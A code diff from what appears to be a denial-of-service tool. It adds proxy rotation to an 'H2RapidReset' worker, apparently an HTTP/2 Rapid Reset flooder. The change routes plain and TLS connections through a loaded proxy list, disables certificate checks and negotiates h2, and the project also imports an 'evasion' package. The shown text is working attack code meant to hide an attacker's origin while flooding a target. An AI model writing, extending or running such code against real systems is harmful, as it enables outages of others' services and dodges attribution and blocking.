@@ -11,6 +11,7 @@ import (
 	"sync/atomic"
 
 	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
+	"github.com/kjsst/sh-mvdos/internal/worker/proxy"
 	"golang.org/x/net/http2"
 	"golang.org/x/net/http2/hpack"
 )
@@ -20,6 +21,7 @@ type H2RapidReset struct {
 	Workers   int
 	Streams   int
 	BatchSize int
+	ProxyFile string
 }
 
 func (w *H2RapidReset) Run(ctx context.Context) (uint64, uint64, error) {
@@ -75,31 +77,34 @@ func (w *H2RapidReset) rapidResetSession(ctx context.Context, targetURL string) 
 	}
 	addr := net.JoinHostPort(host, port)
 
+	proxies, _ := proxy.LoadOrEmpty(w.ProxyFile)
 	useTLS := u.Scheme == "https" || u.Scheme == "wss" || port == "443"
 	var rawConn net.Conn
 	if !useTLS {
-		d := net.Dialer{Timeout: dialTimeout}
-		rawConn, err = d.DialContext(ctx, "tcp", addr)
+		rawConn, err = proxy.DialTCP(ctx, addr, proxies)
 		if err != nil {
 			return 0, err
 		}
 	} else {
-		d := net.Dialer{Timeout: dialTimeout}
-		rawConn, err = tls.DialWithDialer(&d, "tcp", addr, &tls.Config{
+		rawConn, err = proxy.DialTCP(ctx, addr, proxies)
+		if err != nil {
+			return 0, err
+		}
+		tlsConn := tls.Client(rawConn, &tls.Config{
 			ServerName:         host,
 			NextProtos:         []string{"h2", "http/1.1"},
 			InsecureSkipVerify: true,
 			MinVersion:         tls.VersionTLS12,
 		})
-		if err != nil {
+		if err := tlsConn.HandshakeContext(ctx); err != nil {
+			rawConn.Close()
 			return 0, err
 		}
-		if tlsConn, ok := rawConn.(*tls.Conn); ok {
-			if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
-				rawConn.Close()
-				return 0, fmt.Errorf("h2 not negotiated")
-			}
+		if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+			rawConn.Close()
+			return 0, fmt.Errorf("h2 not negotiated")
 		}
+		rawConn = tlsConn
 	}
 	defer rawConn.Close()
 
